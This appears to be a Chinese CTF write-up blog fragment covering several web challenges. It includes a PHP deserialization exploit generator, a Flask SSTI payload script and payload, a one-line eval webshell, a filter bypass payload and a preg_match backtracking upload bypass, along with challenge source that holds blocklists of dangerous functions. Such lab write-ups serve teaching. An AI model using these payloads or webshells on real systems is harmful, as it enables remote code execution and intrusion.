class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 反序列化漏洞利用生成器</span><br><span class="hljs-comment"> * 目标：触发 Admin::__invoke() 执行任意命令</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// 禁用警告显示</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 定义所有必要的类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$token</span> = <span class="hljs-string">&quot;Keykeykey&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$command</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$cmd</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Page</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$filter</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filter</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;anything&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;filter = <span class="hljs-variable">$filter</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$title</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;title = <span class="hljs-string">&quot;title&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Library</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$books</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$book</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;books = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$book</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 要执行的命令（绕过过滤检查）</span><br><span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;echo &quot;&lt;pre&gt;&quot;.`env`.&quot;&lt;/pre&gt;&quot;;&#x27;</span>;<br><span class="hljs-comment">// $command = &#x27;echo file_get_contents(&quot;fl&quot;.&quot;ag.php&quot;);&#x27;;</span><br><br><span class="hljs-comment">// 构建对象链</span><br><span class="hljs-variable">$admin</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Admin</span>(<span class="hljs-variable">$command</span>);<br><span class="hljs-variable">$page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$admin</span>);<br><span class="hljs-variable">$book</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-variable">$library</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Library</span>(<span class="hljs-variable">$book</span>);<br><br><span class="hljs-comment">// 生成序列化数据</span><br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$library</span>);<br><br><span class="hljs-comment">// 修复私有属性格式（根据PHP版本可能需要调整）</span><br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<br>    [<br>        <span class="hljs-string">&#x27;s:6:&quot;\0*\0content&quot;&#x27;</span>,<br>        <span class="hljs-string">&#x27;s:11:&quot;\0Book\0title&quot;&#x27;</span>,<br>        <span class="hljs-string">&#x27;s:13:&quot;\0Page\0filter&quot;&#x27;</span>,<br>        <span class="hljs-string">&#x27;s:11:&quot;\0Admin\0token&quot;&#x27;</span><br>    ],<br>    [<br>        <span class="hljs-string">&#x27;s:14:&quot;\0*\0content&quot;&#x27;</span>,    // 保护属性长度修正<br>        <span class="hljs-string">&#x27;s:11:&quot;\0Book\0title&quot;&#x27;</span>,    // 私有属性保持不变<br>        <span class="hljs-string">&#x27;s:13:&quot;\0Page\0filter&quot;&#x27;</span>,   // 私有属性保持不变<br>        <span class="hljs-string">&#x27;s:11:&quot;\0Admin\0token&quot;&#x27;</span>    // 私有属性保持不变<br>    ],<br>    <span class="hljs-variable">$serialized</span><br>);<br><br><span class="hljs-comment">// 检查是否有被过滤的关键字</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|exec|shell|flag|popen/i&#x27;</span>, <span class="hljs-variable">$serialized</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[-] Error: Dangerous keywords detected in payload!&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Raw serialized data:\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$serialized</span> . <span class="hljs-string">&quot;\n\n&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Base64 encoded payload:\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$serialized</span>) . <span class="hljs-string">&quot;\n\n&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] URL encoded payload:\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$serialized</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">// 验证payload是否可以正常反序列化（可选）</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n[+] Testing unserialize:\n&quot;</span>;<br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialized</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$test</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Unserialize test passed!\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[-] Unserialize failed!\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>拷打两个半小时出来了</p><p>官方wp里的<br>调⽤链：<br>1、Library类中的__destruct()魔术⽅法触发并且遍历 $books 数组  </p><p>2、将数组元素转换为字符串的时候触发Book类中的__toString()魔术⽅法！  </p><p>3、Book类中的__toString()调⽤$this-&gt;content-&gt;getContent()，这⾥的$this-&gt;content是Page对<br>象！  </p><p>4、Page类中getContent()调⽤$this-&gt;process($this-&gt;content)，但是Page类没有process⽅法，所以<br>触发Page类中的__call()⽅法！<br>5、Page类中的__call()执⾏call_user_func($this-&gt;filter, $args[0])，然后将$this-&gt;filter设置为Admin<br>对象！   </p><p>6、Admin对象被当成函数调⽤时触发Admin类中的__invoke()  </p><p>7、然后设置$this-&gt;token &#x3D;&#x3D;&#x3D; “admin_token”，就可以执⾏ eval($this-&gt;command)！   </p><p>8、使⽤passthru()绕过waf检测！  </p><h1 id="FLASK框架有什么漏洞呢"><a href="#FLASK框架有什么漏洞呢" class="headerlink" title="FLASK框架有什么漏洞呢"></a>FLASK框架有什么漏洞呢</h1><p>这个是去星盟的actfwp去找到的fenjing脚本：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload, config_payload<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> urllib<br>logging.basicConfig(level=logging.INFO)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s: <span class="hljs-built_in">str</span></span>):  <span class="hljs-comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span><br>    blacklist = [<span class="hljs-string">&#x27;__&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;sys&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;%2f&#x27;</span>, <span class="hljs-string">&#x27;%2F&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;?&#x27;</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(word <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    shell_payload, _ = exec_cmd_payload(waf, <span class="hljs-string">&quot;grep -r &#x27;flag&#123;&#x27;&quot;</span>)<br>    shell_payload = urllib.parse.quote(shell_payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;shell_payload=&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>替换完waf直接出，有点牛逼    </p><p>最payload:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&#123;&#123;(cycler<span class="hljs-selector-class">.next</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_globals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;o&#x27;</span><span class="hljs-string">&#x27;s&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;p&#x27;</span><span class="hljs-string">&#x27;open&#x27;</span>]</span>(<span class="hljs-string">&#x27;ca&#x27;</span><span class="hljs-string">&#x27;t /fla&#x27;</span><span class="hljs-string">&#x27;g&#x27;</span>))<span class="hljs-selector-class">.read</span>()&#125;&#125;  <br></code></pre></td></tr></table></figure><h1 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h1><p>直接传马即可:  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<br></code></pre></td></tr></table></figure><h1 id="upload2"><a href="#upload2" class="headerlink" title="upload2"></a>upload2</h1><p>请求头里改一下mime即可  </p><h1 id="赛后复现："><a href="#赛后复现：" class="headerlink" title="赛后复现："></a>赛后复现：</h1><h1 id="真-签到"><a href="#真-签到" class="headerlink" title="真-签到"></a>真-签到</h1><p>我甚至怀疑是蜜罐，fuzz sql  一点反应没有<br>结果是弱口令  </p><p>admin&#x2F;admin@123<br>bp默认密码本不说了，rockyou 一千四百万的密码本爆不出来  </p><h1 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h1><p>这题打的太蠢了，看都不看就扔给ai，结果也是搞到最后也没做出来  </p><p>开题给源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$code</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/exec|shell_exec|system|passthru|proc_open|show_source|phpinfo|popen|dl|proc_terminate|touch|escapeshellcmd|escapeshellarg|assert|substr_replace|call_user_func_array|call_user_func|array_filter|array_walk|array_map|register_shutdown_function|register_tick_function|filter_var|filter_var_array|uasort|uksort|array_reduce|array_walk_recursive|pcntl_exec|fopen|fwrite|file_put_contents|readfile|file_get_contents|highlight_file|eval/i&#x27;</span>;<br><br><span class="hljs-variable">$filtered_code</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filtered_code</span>,<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure><p>preg_replace() 函数用于替换字符串。  </p><p>$pattern: 包含要匹配的正则表达式。  </p><p>‘’: 用于替换的内容，即删除所有匹配到的文本。  </p><p>$code: 是要执行 shell 命令的原始代码（可能包含 shell 命令）。  </p><p>call_user_func($filtered_code,$cmd);  </p><p>妈的明明双写绕过就行了，我连自己看一遍题目的耐心都没有了吗  </p><p>payload:<br>code&#x3D;systsystemem&amp;cmd&#x3D;cat &#x2F;flag  </p><h1 id="迷雾密传"><a href="#迷雾密传" class="headerlink" title="迷雾密传"></a>迷雾密传</h1><p>不懂做，看官方wp：  </p><p>根据提示使用</p><p>preg_match 函数的特性    </p><p>preg_match我们能联想到⼀个php相关的特性也就是当preg_match回溯超过⼀百万次的时候后⾯匹<br>配的会直接返回false  </p><p>反正就是，当php使用preg_match 来检测时<br>如： $_FILES[‘file’][‘name’]</p><p>当前面的[‘file’]长度操过1000000时，后面的[‘name’]以及其它参数就都变成false  </p><p>再这道题就是<br>当文件名长度超过一百万个字符时后面的后缀就不会再检测，默认为false  </p><p>马  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> `cat /flag` <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="thinkphp6！no！是thinkphp8！"><a href="#thinkphp6！no！是thinkphp8！" class="headerlink" title="thinkphp6！no！是thinkphp8！"></a>thinkphp6！no！是thinkphp8！</h1><p>搞不懂，以后再来探索</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>test</title>
    <link href="/2025/06/02/test/"/>
    <url>/2025/06/02/test/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>note-37</title>
    <link href="/2025/06/02/note-37/"/>
    <url>/2025/06/02/note-37/</url>
    
    <content type="html"><![CDATA[<h1 id="Mini-L-CTF-miniup"><a href="#Mini-L-CTF-miniup" class="headerlink" title="Mini L-CTF miniup"></a>Mini L-CTF miniup</h1><p>在查看图片处直接查看index.php能得到源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dufs_host</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$dufs_port</span> = <span class="hljs-string">&#x27;5000&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;upload&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>        <span class="hljs-variable">$allowed_extensions</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;webp&#x27;</span>];<br>        <br>        <span class="hljs-variable">$file_extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>, PATHINFO_EXTENSION));<br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_extension</span>, <span class="hljs-variable">$allowed_extensions</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;只允许上传图片文件&#x27;</span>]);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$target_url</span> = <span class="hljs-string">&#x27;http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-variable">$filename</span>);<br>        <br>        <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$target_url</span>);<br>        <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_CUSTOMREQUEST, <span class="hljs-string">&#x27;PUT&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_POSTFIELDS, <span 